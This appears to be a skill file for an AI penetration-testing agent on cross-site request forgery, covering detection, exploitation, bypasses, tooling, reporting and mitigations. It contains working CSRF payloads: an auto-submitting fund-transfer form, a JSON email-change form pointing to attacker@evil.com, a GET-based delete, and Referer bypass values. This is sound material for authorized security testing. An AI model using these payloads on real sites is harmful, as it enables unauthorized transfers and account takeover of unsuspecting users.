---
name: csrf-testing
description: Professional skills and methodology for cross-site request forgery (CSRF) testing
version: 1.0.0
---

# Cross-Site Request Forgery (CSRF) Testing

## Overview

Cross-Site Request Forgery (CSRF) exploits an authenticated user's session to perform unauthorized operations. This skill covers CSRF detection, exploitation, and prevention.

## How the Vulnerability Works

- An attacker tricks a user into visiting a malicious page
- The malicious page automatically sends requests to the target website
- The browser automatically includes the user's authentication information (cookies/session)
- The target mistakes the request for a legitimate user action

## Testing Methods

### 1. Identify Sensitive Operations

- Password changes
- Email address changes
- Fund transfers
- Permission changes
- Data deletion
- Status updates

### 2. Check for CSRF Tokens

**Check whether token protection exists:**
```html
<!-- Protected by a token -->
<form method="POST" action="/change-password">
  <input type="hidden" name="csrf_token" value="abc123">
  <input type="password" name="new_password">
</form>

<!-- No token protection: CSRF risk -->
<form method="POST" action="/change-email">
  <input type="email" name="new_email">
</form>
```

### 3. Validate Tokens

**Test token predictability:**
- Is the token based on a timestamp?
- Is the token based on a user ID?
- Can the token be reused?
- Is the token shared across requests?

### 4. Check Referer Validation

**Test whether Referer checks can be bypassed:**
```javascript
// Normal request
Referer: https://target.com/change-password

// Test bypasses
Referer: https://target.com.evil.com
Referer: https://evil.com/?target.com
Referer: (empty)
```

## Exploitation Techniques

### Basic CSRF Attack

**Automatic HTML form submission:**
```html
<form action="https://target.com/api/transfer" method="POST" id="csrf">
  <input type="hidden" name="to" value="attacker_account">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('csrf').submit();</script>
```

### JSON CSRF

**Bypass Content-Type checks:**
```html
<!-- Submit JSON using a form -->
<form action="https://target.com/api/update" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","ignore":"' value='"}'>
</form>
<script>document.forms[0].submit();</script>
```

### CSRF Through GET Requests

**Use a GET request:**
```html
<img src="https://target.com/api/delete?id=123">
```

## Bypass Techniques

### Token Bypass

**If the token is in a cookie:**
```javascript
// If the token exists in both a cookie and the form
// Try submitting only the cookie token
fetch('https://target.com/api/action', {
  method: 'POST',
  credentials: 'include',
  body: 'action=delete&id=123'
  // Omit the csrf_token parameter and rely on the cookie
});
```

### SameSite Cookie Bypass

**Using subdomains:**
- With SameSite=Lax, GET requests may still carry cookies
- Use a subdomain for the attack

### Double-Submit Cookies

**Bypass token validation:**
```html
<!-- Token in a cookie with flawed validation logic -->
<form action="https://target.com/api/action" method="POST">
  <input type="hidden" name="csrf_token" value="">
  <script>
    // Read the token from the cookie
    document.cookie.split(';').forEach(c => {
      if(c.trim().startsWith('csrf_token=')) {
        document.querySelector('input[name="csrf_token"]').value = 
          c.split('=')[1];
      }
    });
  </script>
</form>
```

## Tools

### Burp Suite

**Use the CSRF PoC generator:**
1. Intercept the target request
2. Right-click → Engagement tools → Generate CSRF PoC
3. Test the generated PoC

### OWASP ZAP

```bash
# Scan for CSRF with ZAP
zap-cli quick-scan --self-contained --start-options '-config api.disablekey=true' http://target.com
```

## Verification and Reporting

### Verification Steps

1. Confirm the target operation lacks CSRF token protection
2. Construct a malicious request and verify it can execute
3. Assess impact (data disclosure, privilege escalation, financial loss, etc.)
4. Record the complete proof of concept
5. Record confirmed findings with `report_finding`, the platform's only entry point for findings. Include location, type, severity, reproduction steps/PoC, and remediation guidance

### Report Essentials

- Vulnerability location and affected operations
- Attack scenario and impact
- Complete exploitation steps and PoC
- Remediation guidance (CSRF tokens, SameSite cookies, Referer validation, etc.)

## Mitigations

### Recommended Approach

1. **CSRF Token**
   - Include a unique token in every form
   - Store the token in the session
   - Validate the token

2. **SameSite Cookie**
   ```javascript
   Set-Cookie: session=abc123; SameSite=Strict; Secure
   ```

3. **Double-submit cookies**
   - Place the token in both the cookie and the form
   - Verify that both values match

4. **Referer validation**
   - Verify that the Referer is same-origin
   - Handle empty Referer values carefully

## Considerations

- Test only in authorized environments
- Avoid affecting real user accounts
- Record every testing step
- Account for behavioral differences between browsers